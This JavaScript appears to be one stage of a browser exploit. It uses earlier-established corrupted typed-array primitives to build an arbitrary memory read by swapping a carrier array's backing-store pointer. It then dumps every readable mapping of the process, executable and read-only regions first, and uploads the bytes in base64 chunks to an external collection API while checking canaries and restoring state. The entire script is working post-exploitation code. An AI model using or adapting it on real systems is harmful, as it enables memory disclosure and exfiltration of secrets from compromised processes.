// Dump all readable mappings except the one 16 KiB mapping that faulted twice.
// Prioritize executable and read-only data; record the skipped map explicitly.
var result, phase="preflight";
try {
  var state=window.__fw14ArrayState, n=window.__fw14NativeInvoke;
  var held=window.__fw14FullVMMap;
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !n || !held || !held.maps || !api || !api.uploadChunkSync)
    throw new Error("full_process_plan_missing");
  var pid=n.call("getpid",[]);
  if (pid.high!==0 || pid.value!==held.pid || state.array[0]!==state.a)
    throw new Error("page_identity_changed");
  var carrier=state.ownedTypedView, forged=state.view;
  if (carrier.length!==65536 || carrier[0]!==0x31 || carrier[7]!==0xa8)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var i=0;i<count;i++) out.push(forged[index+i]);
    return out;
  }
  function valueOf(bytes) {
    var v=0;
    for (var i=bytes.length-1;i>=0;i--) v=v*256+bytes[i];
    return v;
  }
  function pointerBytes(v) {
    var out=[];
    for (var i=0;i<8;i++) out.push(Math.floor(v/Math.pow(2,8*i))&255);
    return out;
  }
  function same(a,b) {
    if (a.length!==b.length) return false;
    for (var i=0;i<a.length;i++) if (a[i]!==b[i]) return false;
    return true;
  }
  var objectWord;
  try {
    state.array[0]=carrier;
    objectWord=valueOf(bytesAt(state.index,8));
  } finally {state.array[0]=state.a;}
  var slot=objectWord-state.calibratedViewBase+8;
  if (!Number.isSafeInteger(slot) || slot<0 || slot+8>=16777216)
    throw new Error("carrier_slot_outside_view");
  var original=bytesAt(slot,8);
  function readAt(address,count) {
    var pointer=pointerBytes(address);
    try {
      for (var i=0;i<8;i++) forged[slot+i]=pointer[i];
      var bytes=[];
      for (var j=0;j<count;j++) bytes.push(carrier[j]);
      return bytes;
    } finally {
      for (var k=0;k<8;k++) forged[slot+k]=original[k];
    }
  }
  var targets=[],skipped=[];
  for (var m=0;m<held.maps.length;m++) {
    var map=held.maps[m];
    if ((map.prot&1)===0) continue;
    var size=map.end-map.start;
    if (!Number.isSafeInteger(map.start) || map.start<0x10000 ||
        !Number.isSafeInteger(size) || size<1 || size>268435456)
      throw new Error("readable_map_outside_upload_bounds_"+m);
    var prior=m?held.maps[m-1]:null;
    if (map.prot===3 && map.type===1 && size===16384 && prior &&
        prior.prot===1 && prior.type===2 &&
        prior.end-prior.start===114688) {
      skipped.push({index:m+1,start:map.start,size:size});
      continue;
    }
    targets.push({index:m+1,start:map.start,size:size,
      kind:map.prot===5?"rx":map.prot===1?"ro":"rw"});
  }
  if (!targets.length || skipped.length!==1)
    throw new Error("faulted_map_signature_not_unique_"+skipped.length);
  var rank={rx:0,ro:1,rw:2};
  targets.sort(function(a,b){return rank[a.kind]-rank[b.kind] || a.start-b.start;});
  var cursor=window.__fw14FullDumpCursorV2;
  if (!cursor) cursor={index:0,offset:0};
  if (!Number.isInteger(cursor.index) || cursor.index<0 ||
      cursor.index>targets.length || !Number.isInteger(cursor.offset) ||
      cursor.offset<0) throw new Error("cursor_invalid");
  var maxChunks=window.__fw14FullDumpCanaryDoneV2?128:2;
  var uploaded=0,bytesUploaded=0,lastIndex=-1,lastStart=0;
  var startIndex=cursor.index;
  if (api.markSync) api.markSync("full_process_dump_before");
  phase="chunk_upload";
  while (uploaded<maxChunks && cursor.index<targets.length &&
         cursor.index===startIndex) {
    var target=targets[cursor.index];
    if (cursor.offset>=target.size) {
      if (cursor.offset!==target.size) throw new Error("cursor_past_map");
      cursor.index++; cursor.offset=0; continue;
    }
    var length=Math.min(8192,target.size-cursor.offset);
    var data=readAt(target.start+cursor.offset,length);
    if (!same(bytesAt(slot,8),original) || state.array[0]!==state.a)
      throw new Error("carrier_pointer_not_restored");
    var binary="";
    for (var b=0;b<data.length;b++) binary+=String.fromCharCode(data[b]);
    var receipt=api.uploadChunkSync({pid:pid.value,
      module_handle:target.index,segment_kind:target.kind,
      range_start:target.start,range_size:target.size,
      offset:cursor.offset,data_b64:btoa(binary)});
    if (!receipt || receipt.bytes!==length ||
        typeof receipt.sha256!=="string" || receipt.sha256.length!==64)
      throw new Error("chunk_receipt_invalid");
    uploaded++; bytesUploaded+=length;
    lastIndex=target.index;lastStart=target.start;
    cursor.offset+=length;
    if (cursor.offset===target.size) {cursor.index++;cursor.offset=0;}
    window.__fw14FullDumpCursorV2=cursor;
  }
  if (!window.__fw14FullDumpCanaryDoneV2 && uploaded===2)
    window.__fw14FullDumpCanaryDoneV2=true;
  var restored=same(bytesAt(slot,8),original) &&
    carrier[0]===0x31 && carrier[7]===0xa8 && state.array[0]===state.a;
  var pidAfter=n.call("getpid",[]);
  if (api.markSync) api.markSync("full_process_dump_done");
  result={id:"full_process_dump_v2",
    status:restored && pidAfter.value===pid.value && pidAfter.high===0?
      "pass":"fail",
    details:{pid:pid.value,uploaded:uploaded,bytes:bytesUploaded,
      map_index:cursor.index,map_offset:cursor.offset,
      map_total:targets.length,done:cursor.index===targets.length,
      last_index:lastIndex,last_start:lastStart,restored:restored,
      skipped_index:skipped[0].index,skipped_start:skipped[0].start}};
} catch(error) {
  result={id:"full_process_dump_v2",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
